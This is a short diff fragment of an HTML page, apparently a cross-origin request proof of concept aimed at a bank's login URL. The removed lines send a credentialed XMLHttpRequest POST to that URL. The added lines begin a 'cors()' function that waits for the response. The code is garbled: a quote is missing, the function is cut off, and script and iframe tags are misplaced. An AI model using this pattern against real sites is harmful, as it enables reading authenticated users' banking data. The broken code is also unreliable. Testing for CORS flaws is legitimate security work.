@@ -10,9 +10,13 @@
 </div>
  
 <script>
-xhttp.open("POST", "https://apply.usbank.com/oas/oaslogin.html,true);
-xhttp.withcredentials = true;
-xhttp.send();<iframe>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+	</script>
+
+<iframe>
 function cors() {
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
